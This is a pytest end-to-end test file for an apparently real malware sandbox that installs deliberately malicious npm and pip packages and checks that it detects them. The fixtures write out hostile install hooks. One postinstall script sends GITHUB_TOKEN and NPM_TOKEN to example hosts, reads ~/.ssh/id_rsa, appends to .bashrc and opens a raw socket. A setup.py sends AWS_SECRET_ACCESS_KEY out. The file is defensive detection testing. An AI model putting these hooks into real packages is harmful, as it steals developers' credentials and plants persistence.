"""End to end, nothing mocked: real containers, the real proxy with its
per-run CA, real strace, real pip. Skipped when Docker or the internet is
not available. Each test is one sandbox run (tens of seconds)."""
from __future__ import annotations

import json
import socket

import pytest

from malwhunter.chamber.runner import _docker_available, detonate_package, detonate_pypi_package


def _internet() -> bool:
    try:
        socket.create_connection(("example.com", 443), timeout=3).close()
        return True
    except OSError:
        return False


pytestmark = pytest.mark.skipif(
    not (_docker_available() and _internet()), reason="needs Docker and internet access"
)


def test_npm_install_script_theft_is_seen_over_https_in_the_trace_and_on_raw_sockets(tmp_path):
    (tmp_path / "evil.js").write_text(
        "const fs = require('fs'), os = require('os'), net = require('net'), https = require('https');\n"
        # Node's own HTTPS client, which used to ignore the proxy and leave the run looking clean
        "https.get('https://example.org/?t=' + process.env.GITHUB_TOKEN).on('error', () => {});\n"
        "try { fs.readFileSync(os.homedir() + '/.ssh/id_rsa'); } catch (e) {}\n"
        "try { fs.appendFileSync(os.homedir() + '/.bashrc', 'x\\n'); } catch (e) {}\n"
        # a raw socket ignores every proxy setting; only the trace can see the attempt
        "net.connect(443, '93.184.216.34').on('error', () => {});\n"
        "setTimeout(() => process.exit(0), 2500);\n"
    )
    pj = {"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node evil.js && curl -s -o /dev/null https://example.com/?d=$NPM_TOKEN || true"}}
    (tmp_path / "package.json").write_text(json.dumps(pj))
    summary: dict = {}
    signals = detonate_package("x", "1.0.0", tmp_path, pj, summary=summary)
    categories = {s.category for s in signals}

    assert summary["tls_inspected"] is True and summary["https_requests_inspected"] >= 1
    assert "GITHUB_TOKEN" in summary["canaries_leaked"]  # Node https, read inside the TLS tunnel
    assert {"canary-exfiltration", "sensitive-file-access", "persistence-attempt", "proxy-bypass-attempt"} <= categories
    assert "93.184.216.34:443" in summary["tracing"]["direct_connection_attempts"]
    assert any(".ssh/id_rsa" in f for f in summary["tracing"]["sensitive_or_persistent_files"])
    assert len(signals) == len({s.id for s in signals})  # repeated observations collapsed


def test_pip_install_of_a_malicious_sdist_runs_in_the_sandbox_and_is_caught(tmp_path):
    (tmp_path / "evilpkg").mkdir()
    (tmp_path / "evilpkg" / "__init__.py").write_text("")
    (tmp_path / "setup.py").write_text(
        "import os, urllib.request\n"
        "from setuptools import setup\n"
        "try:\n    urllib.request.urlopen('https://example.com/c?t=' + os.environ.get('AWS_SECRET_ACCESS_KEY', ''), timeout=8)\n"
        "except Exception:\n    pass\n"
        "setup(name='evilpkg', version='1.0', packages=['evilpkg'])\n"
    )
    summary: dict = {}
    signals = detonate_pypi_package("evilpkg", "1.0", tmp_path, "", summary=summary)

    assert "AWS_SECRET_ACCESS_KEY" in summary["canaries_leaked"]
    assert any(s.category == "canary-exfiltration" for s in signals)
    assert list(summary["scripts_run"]) == ["pip install", "import"]
    assert summary["exit_code"] == 0 and "evilpkg" in summary["stdout_tail"]


def test_files_made_by_a_different_uid_can_still_be_cleaned_up(tmp_path):
    """The failure CI hit: the sandbox user's uid is not the uid running the scan, so
    what the install creates could not be deleted and the whole run raised."""
    import os
    import shutil
    import subprocess

    from malwhunter.chamber import runner

    if os.getuid() == 0:
        pytest.skip("root can delete anything, so there is nothing to reproduce")
    runner._ensure_images()
    scratch = tmp_path / "scratch"
    scratch.mkdir()
    os.chmod(scratch, 0o777)
    other_uid = os.getuid() + 4321
    made = subprocess.run(
        ["docker", "run", "--rm", "--user", f"{other_uid}:{other_uid}", "-v", f"{scratch}:/s", runner.CONTAINER_IMAGE,
         "sh", "-c", "umask 077; mkdir /s/private /s/pkg.egg-info; echo x > /s/private/f; echo y > /s/pkg.egg-info/f"],
        capture_output=True, timeout=60,
    )
    assert made.returncode == 0, made.stderr
    with pytest.raises(PermissionError):
        shutil.rmtree(scratch)  # exactly what the unfixed code did at the end of every run

    runner._reclaim_scratch(scratch, runner.CONTAINER_IMAGE)
    shutil.rmtree(scratch)
    assert not scratch.exists()
